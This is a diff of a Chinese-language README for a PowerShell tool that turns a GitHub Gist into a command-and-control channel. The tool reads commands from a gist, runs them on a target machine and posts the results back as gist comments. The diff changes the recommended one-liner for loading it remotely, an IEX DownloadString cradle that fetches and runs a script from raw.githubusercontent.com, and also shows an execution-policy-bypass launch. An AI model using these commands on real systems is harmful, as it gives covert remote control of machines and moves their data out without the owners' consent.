@@ -4,7 +4,7 @@
 	Demo Result Gist:https://gist.github.com/zlocal/1d449f3c195531c8cafbebfe808ea46e
 
 ####使用方法：<br>
-##### 1，创建github账户，访问https://github.com/settings/tokens/new，选中 gist   Create gists ，创建访问Gists的token.<br>
+##### 1，创建github账户，访问https://github.com/settings/tokens/new  选中 gist   Create gists ，创建访问Gists的token.<br>
 ##### 2, 访问 https://gist.github.com/ ，创建一个Gist，属性最好为private,只有自己能访问查看结果，名称为cmd.例：<br>
 ###### 为了展示，我设置了public https://gist.github.com/zlocal/1d449f3c195531c8cafbebfe808ea46e <br>
 	Command:"time /T"
@@ -25,16 +25,16 @@ $checkTime=60;				# 每次获取命令结果需要等待的时间，秒为单位
 
 ##### 4, 使powershell在目标机器上执行
 ##### Powershell执行方法<br>
-一句话远程加载 <br>
-```Powershell
-powershell IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1')
+一句话远程加载(推荐) <br>
+```
+powershell IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/zlocal/Powershell-Github-Shell/master/PGShell.ps1')
 ```
 一句话本地加载<br>
-```Powershell
+```
 powershell IEX ([System.IO.File]::readAllText('PowershellGitShell.ps1'));	//powershell
 ```
 一句话文件执行<br>
-```Powershell
+```
 powershell -executionPolicy bypass -File "c:/test/PowershellGitShell.ps1"	//powershell
 ```
 ##### 5，可以修改cmd gist的内容，在$checkTime秒后刷新网页，结果会在评论中。结果需要使用URL DECODE解码。
